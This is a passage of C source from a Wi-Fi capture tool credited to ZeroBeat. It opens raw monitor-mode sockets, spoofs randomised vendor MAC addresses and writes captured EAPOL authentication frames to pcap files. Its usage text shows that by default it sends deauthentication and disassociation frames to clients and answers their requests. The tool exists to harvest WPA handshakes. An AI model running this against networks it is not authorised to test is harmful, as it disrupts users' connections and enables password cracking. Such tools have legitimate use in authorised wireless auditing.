				if(fd_ippcap != 0)
					{
					CHK_ERR(retw = write(fd_ippcap, packetin, pkh->incl_len +PCAPREC_SIZE));
					}
				continue;
				}
			continue;
			}
		else if((mac_ptr->subtype == IEEE80211_STYPE_QOS_DATA) || (mac_ptr->subtype == IEEE80211_STYPE_QOS_DATA_CFACK) || (mac_ptr->subtype == IEEE80211_STYPE_QOS_DATA_CFPOLL) || (mac_ptr->subtype == IEEE80211_STYPE_QOS_DATA_CFACKPOLL))
			{
			if(caplen < (int)(MAC_SIZE_QOS +LLC_SIZE))
				{
				continue;
				}
			qosflag = true;
			llc = (llc_t*)(packet_ptr +MAC_SIZE_QOS);
			if(((ntohs(llc->type)) == LLC_TYPE_AUTH) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
				{
				if(caplen < (int)(MAC_SIZE_QOS +LLC_SIZE +EAPAUTH_SIZE))
					{
					continue;
					}
				eap = (eapauth_t*)(packet_ptr +MAC_SIZE_QOS +LLC_SIZE);
				wpak = (wpakey_t*)(packet_ptr +MAC_SIZE_QOS +LLC_SIZE +EAPAUTH_SIZE);
				process80211networkauthentication();
				CHK_ERR(retw = write(fd_pcap, packetin, pkh->incl_len +PCAPREC_SIZE));
				continue;
				}
			else if(((ntohs(llc->type)) == LLC_TYPE_IPV4) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
				{
				if(fd_ippcap != 0)
					{
					CHK_ERR(retw = write(fd_ippcap, packetin, pkh->incl_len +PCAPREC_SIZE));
					}
				continue;
				}
			else if(((ntohs(llc->type)) == LLC_TYPE_IPV6) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
				{
				if(fd_ippcap != 0)
					{
					CHK_ERR(retw = write(fd_ippcap, packetin, pkh->incl_len +PCAPREC_SIZE));
					}
				}
			continue;
			}
		}
	}
return;
}
/*===========================================================================*/
static bool opensocket()
{
struct ifreq ifr;
struct sockaddr_ll ll;
const int protocol = ETH_P_ALL;
if((fd_socket = socket(PF_PACKET, SOCK_RAW, htons(protocol))) < 0)
	{
	perror( "socket failed (do you have root priviledges?)" );
	return false;
	}


memset(&ifr, 0, sizeof(ifr));
strncpy( ifr.ifr_name, interfacename, IFNAMSIZ);
ifr.ifr_flags = 0;
if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0)
	{
	perror("failed to get SIOCGIFFLAGS");
	close(fd_socket);
	return false;
	}

ifr.ifr_flags |= IFF_PROMISC | IFF_UP;
if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0)
	{
	perror("monitor mode failed");
	close(fd_socket);
	return false;
	}

if (ioctl(fd_socket, SIOCGIFINDEX, &ifr) < 0)
	{
	perror("ioctl[SIOCGIFINDEX]");
	close(fd_socket);
	return false;
	}

memset(&ll, 0, sizeof(ll));
ll.sll_family = AF_PACKET;
ll.sll_ifindex = ifr.ifr_ifindex;
ll.sll_protocol = htons(protocol);
if(bind(fd_socket, (struct sockaddr*) &ll, sizeof(ll)) < 0)
	{
	perror("bind[AF_PACKET]");
	close(fd_socket);
	return false;
	}
return true;
}
/*===========================================================================*/
static bool globalinit()
{
int c;
static struct stat statinfo;
int ret;
pthread_t thread1;
#ifdef DOGPIOSUPPORT
pthread_t thread2;
#endif

static char newpcapoutname[PATH_MAX +2];

myouiap = myvendorap[rand() % ((MYVENDORAP_SIZE /sizeof(int)))];
mynicap = rand() & 0xffffff;
mac_mybcap[5] = mynicap & 0xff;
mac_mybcap[4] = (mynicap >> 8) & 0xff;
mac_mybcap[3] = (mynicap >> 16) & 0xff;
mac_mybcap[2] = myouiap & 0xff;
mac_mybcap[1] = (myouiap >> 8) & 0xff;
mac_mybcap[0] = (myouiap >> 16) & 0xff;
#ifdef BIG_ENDIAN_HOST
mac_mybcap[0] = mynicap & 0xff;
mac_mybcap[1] = (mynicap >> 8) & 0xff;
mac_mybcap[2] = (mynicap >> 16) & 0xff;
mac_mybcap[3] = myouiap & 0xff;
mac_mybcap[4] = (myouiap >> 8) & 0xff;
mac_mybcap[5] = (myouiap >> 16) & 0xff;
#endif
mynicap++;
mac_myap[5] = mynicap & 0xff;
mac_myap[4] = (mynicap >> 8) & 0xff;
mac_myap[3] = (mynicap >> 16) & 0xff;
mac_myap[2] = myouiap & 0xff;
mac_myap[1] = (myouiap >> 8) & 0xff;
mac_myap[0] = (myouiap >> 16) & 0xff;
#ifdef BIG_ENDIAN_HOST
mac_myap[0] = mynicap & 0xff;
mac_myap[1] = (mynicap >> 8) & 0xff;
mac_myap[2] = (mynicap >> 16) & 0xff;
mac_myap[3] = myouiap & 0xff;
mac_myap[4] = (myouiap >> 8) & 0xff;
mac_myap[5] = (myouiap >> 16) & 0xff;
#endif
myouista = myvendorsta[rand() % ((MYVENDORSTA_SIZE /sizeof(int)))];
mynicsta = rand() & 0xffffff;
mac_mysta[5] = mynicsta & 0xff;
mac_mysta[4] = (mynicsta >> 8) & 0xff;
mac_mysta[3] = (mynicsta >> 16) & 0xff;
mac_mysta[2] = myouista & 0xff;
mac_mysta[1] = (myouista >> 8) & 0xff;
mac_mysta[0] = (myouista >> 16) & 0xff;
#ifdef BIG_ENDIAN_HOST
mac_mysta[0] = mynicsta & 0xff;
mac_mysta[1] = (mynicsta >> 8) & 0xff;
mac_mysta[2] = (mynicsta >> 16) & 0xff;
mac_mysta[3] = myouista & 0xff;
mac_mysta[4] = (myouista >> 8) & 0xff;
mac_mysta[5] = (myouista >> 16) & 0xff;
#endif


if(pcapoutname != NULL)
	{
	c = 0;
	strcpy(newpcapoutname, pcapoutname);
	while(stat(newpcapoutname, &statinfo) == 0)
		{
		snprintf(newpcapoutname, PATH_MAX, "%s-%d.pcap", pcapoutname, c);
		c++;
		}
	fd_pcap = hcxopenpcapdump(newpcapoutname);
	if(fd_pcap <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", newpcapoutname);
		return false;
		}
	}

if(ippcapoutname != NULL)
	{
	c = 0;
	strcpy(newpcapoutname, ippcapoutname);
	while(stat(newpcapoutname, &statinfo) == 0)
		{
		snprintf(newpcapoutname, PATH_MAX, "%s-%d.pcap", ippcapoutname, c);
		c++;
		}
	fd_ippcap = hcxopenpcapdump(newpcapoutname);
	if(fd_ippcap <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", newpcapoutname);
		return false;
		}
	}
ret = pthread_create(&thread1, NULL, &channelswitchthread, NULL);
if(ret != 0)
	{
	printf("failed to create thread\n");
	return false;
	}

#ifdef DOGPIOSUPPORT
ret = pthread_create(&thread2, NULL, &rpiflashthread, NULL);
if(ret != 0)
	{
	printf("failed to create thread\n");
	return false;
	}
if(wiringPiSetup() == -1)
	{
	puts ("wiringPi failed!");
	return false;
	}
pinMode(0, OUTPUT);
pinMode(7, INPUT);
for (c = 0; c < 5; c++)
	{
	digitalWrite(0 , HIGH);
	delay (200);
	digitalWrite(0, LOW);
	delay (200);
	}
#endif

if((macstaessidliste = calloc((MACSTAESSIDLISTZEMAX), MACESSIDLIST_SIZE)) == NULL)
	{
	return false;
	}
if((macapessidliste = calloc((MACAPESSIDLISTZEMAX), MACESSIDLIST_SIZE)) == NULL)
	{
	return false;
	}

if((macmyapessidliste = calloc((MACMYAPESSIDLISTZEMAX), MACESSIDLIST_SIZE)) == NULL)
	{
	return false;
	}

if((networkliste = calloc((NETWORKLISTZEMAX), NETWORKLIST_SIZE)) == NULL)
	{
	return false;
	}

signal(SIGINT, programmende);

return true;
}
/*===========================================================================*/
static size_t chop(char *buffer, size_t len)
{
static char *ptr;

ptr = buffer +len -1;
while(len)
	{
	if (*ptr != '\n')
		break;
	*ptr-- = 0;
	len--;
	}
while(len)
	{
	if (*ptr != '\r')
		break;
	*ptr-- = 0;
	len--;
	}
return len;
}
/*---------------------------------------------------------------------------*/
static int fgetline(FILE *inputstream, size_t size, char *buffer)
{
static size_t len;
static char *buffptr;

if(feof(inputstream))
	return -1;
buffptr = fgets (buffer, size, inputstream);
if(buffptr == NULL)
	return -1;
len = strlen(buffptr);
len = chop(buffptr, len);
return len;
}
/*===========================================================================*/
static void readblacklist(char *blacklistname)
{
int len;
int c;
networklist_t *zeiger;
static FILE *fh_black;


static char linein[60];

if((fh_black = fopen(blacklistname, "r")) == NULL)
	{
	printf("opening blacklist failed %s\n", blacklistname);
	return;
	}

c = 0;
zeiger = networkliste;
while((len = fgetline(fh_black, 60, linein)) != -1)
	{
	if((len < 27) || (len > 58))
		{
		printf("reading blacklist entry failed\n");
		continue;
		}
	if((linein[0x0c] != ':') && (linein[0x19] != ':'))
		{
		printf("reading blacklist entry failed\n");
		continue;
		}
	if(hex2bin(&linein[0x0], zeiger->mac_ap, 6) == false)
		{
		printf("reading blacklist entry failed %s\n", blacklistname);
		memset(zeiger, 0, NETWORKLIST_SIZE);
		break;
		}
	if(hex2bin(&linein[0x0d], zeiger->mac_sta, 6) == false)
		{
		printf("reading blacklist entry failed %s\n", blacklistname);
		memset(zeiger, 0, NETWORKLIST_SIZE);
		break;
		}
	zeiger->essid_len = len -26;
	if(zeiger->essid_len == 0) 
		{
		printf("reading blacklist entry failed %s\n", blacklistname);
		memset(zeiger, 0, NETWORKLIST_SIZE);
		break;
		}
	memcpy(zeiger->essid, &linein[0x1a], zeiger->essid_len);
	if(c >= NETWORKLISTZEMAX)
		{
		printf("reached maximum of blacklist entries at %d\n", c);
		break;
	zeiger->status = 0xf;
		}
	zeiger++;
	c++;
	}
fclose(fh_black);
return;
}
/*===========================================================================*/
static bool ischannelindefaultlist(int userchannel)
{
int cpd = 0;
while(channeldefaultlist[cpd] != 0)
	{
	if(userchannel == channeldefaultlist[cpd])
		{
		return true;
		}
	cpd++;
	}
return false;
}
/*===========================================================================*/
static bool processuserscanlist(char *optarglist)
{
char *ptr;
static char *userscanlist;

userscanlist = strdupa(optarglist);
cpa = 0;
ptr = strtok(userscanlist, ",");
while(ptr != NULL)
	{
	channelscanlist[cpa] = atoi(ptr);
	if(ischannelindefaultlist(channelscanlist[cpa]) == false)
		{
		return false;
		}
	ptr = strtok(NULL, ",");
	cpa++;
	if(cpa > 127)
		{
		return false;
		}
	}
channelscanlist[cpa] = 0;
cpa = 0;
return true;
}
/*===========================================================================*/
static bool check_wlaninterface(const char* ifname)
{
int fd_info;
struct iwreq fpwrq;
memset(&fpwrq, 0, sizeof(fpwrq));
strncpy(fpwrq.ifr_name, ifname, IFNAMSIZ);

if((fd_info = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
	perror( "socket info failed" );
	return false;
	}

if (ioctl(fd_info, SIOCGIWNAME, &fpwrq) != -1)
	{
	return true;
	}
close(fd_info);
return false;
}
/*===========================================================================*/
static void show_wlaninterfaces()
{
struct ifaddrs *ifaddr=NULL;
struct ifaddrs *ifa = NULL;
struct sockaddr_ll *sfda;
static int i = 0;

if(getifaddrs(&ifaddr) == -1)
	{
	perror("getifaddrs failed ");
	}
else
	{
	printf("suitable wlan interfaces:\n");
	for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
		{
		if((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET))
			{
			if(check_wlaninterface(ifa->ifa_name) == true)
				{
				sfda = (struct sockaddr_ll*)ifa->ifa_addr;
				printf("INTERFACE: %s [", ifa->ifa_name);
				for (i=0; i < sfda->sll_halen; i++)
					{
					printf("%02x", (sfda->sll_addr[i]));
					}
				printf("]\n");
				}
			}
		}
	freeifaddrs(ifaddr);
	}
}
/*===========================================================================*/
__attribute__ ((noreturn))
static void version(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n", eigenname, VERSION, VERSION_JAHR);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static void usage(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n"
	"usage:\n"
	"%s <options>\n"
	"\n"
	"options:\n"
	"-i <interface> : interface (monitor mode must be enabled)\n"
	"                 ip link set <interface> down\n"
	"                 iw dev <interface> set type monitor\n"
	"                 ip link set <interface> up\n"
	"-o <dump file> : output file in pcapformat including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"-O <dump file> : ip based traffic output file in pcapformat including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"-c <digit>     : set scanlist  (1,2,3,... / default = default scanlist)\n"
	"                 default scanlist: 1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12\n"
	"                 allowed channels:\n"
	"                 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14\n"
	"                 34, 36, 38, 40, 42, 44, 46, 48, 52, 56, 58, 60, 62, 64\n"
	"                 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 147, 149, 151, 153, 155, 157\n"
	"                 161, 165, 167, 169, 184, 188, 192, 196, 200, 204, 208, 212, 216\n"
	"-t <seconds>   : stay time on channel before hopping to the next channel\n"
	"                 default = 5 seconds\n"
	"-T <maxerrors> : terminate after <x> maximal errors\n"
	"                 default = 1000000\n"
	"-D             : do not transmit deauthentications or disassociations\n"
	"-R             : do not transmit requests\n"
	"-A             : do not respond to requests from clients\n"
	"-B <file>      : blacklist (do not deauthenticate clients from this hosts)\n"
	"                 format = mac_ap:mac_sta:ESSID\n"
	"                 112233445566:aabbccddeeff:networkname (max. 32 chars)\n"
	"-P             : enable poweroff\n"
	"-s             : enable status messages\n"
	"-I             : show suitable wlan interfaces and quit\n"
	"-h             : show this help\n"
	"-v             : show version\n"
	"\n", eigenname, VERSION, VERSION_JAHR, eigenname);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static void usageerror(char *eigenname)
{
printf("%s %s (C) %s by ZeroBeat\n"
	"usage: %s -h for help\n", eigenname, VERSION, VERSION_JAHR, eigenname);
exit(EXIT_FAILURE);
}
/*===========================================================================*/
int main(int argc, char *argv[])
{
static int auswahl;
char *blacklistname = NULL;

srand(time(NULL));
setbuf(stdout, NULL);
while ((auswahl = getopt(argc, argv, "i:o:O:c:t:T:DRAB:PsIhv")) != -1)
	{
	switch (auswahl)
		{
		case 'i':
		interfacename = optarg;
		if(interfacename == NULL)
			{
			fprintf(stderr, "no interface specified\n");
			exit(EXIT_FAILURE);
			}
		break;

		case 'o':
		pcapoutname = optarg;
		break;

		case 'O':
		ippcapoutname = optarg;
		break;

		case 'c':
		if(processuserscanlist(optarg) == false)
			{
			fprintf(stderr, "unknown channel selected\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 't':
		staytime = strtol(optarg, NULL, 10);
		if(staytime <= 1)
			{
			fprintf(stderr, "wrong hoptime\nsetting hoptime to 1\n");
			staytime = TIME_INTERVAL;
			}
		break;

		case 'T':
		maxerrorcount = strtol(optarg, NULL, 10);
		break;

		case 'D':
		deauthflag = true;
		break;

		case 'R':
		requestflag = true;
		break;

		case 'A':
		respondflag = true;
		break;

		case 'B':
		blacklistname = optarg;
		break;

		case 'P':
		poweroffflag = true;
		break;

		case 's':
		wantstatusflag = true;
		break;

		case 'I':
		showinterfaces = true;
		break;

		case 'h':
		usage(basename(argv[0]));

		case 'v':
		version(basename(argv[0]));

		default:
		usageerror(basename(argv[0]));
		}
	}

if(showinterfaces == true)
	{
	show_wlaninterfaces();
	return EXIT_SUCCESS;
	}

if(interfacename == NULL)
	{
	fprintf(stderr, "no interface selected\n");
	exit(EXIT_FAILURE);
	}

if(pcapoutname == NULL)
	{
	fprintf(stderr, "no output pcap file selected\n");
	exit(EXIT_FAILURE);
	}

if(getuid() != 0)
	{
	fprintf(stderr, "this program requires root privileges\n");
	exit(EXIT_FAILURE);
	}

if(opensocket() == false)
	{
	fprintf(stderr, "failed to init socket\n");
	exit(EXIT_FAILURE);
	}

if(globalinit() == false)
	{
	fprintf(stderr, "failed to init globals\n");
	exit(EXIT_FAILURE);
	}

if(blacklistname != NULL)
	{
	readblacklist(blacklistname);
	}

processpackets(); 

return EXIT_SUCCESS;
}
/*===========================================================================*/
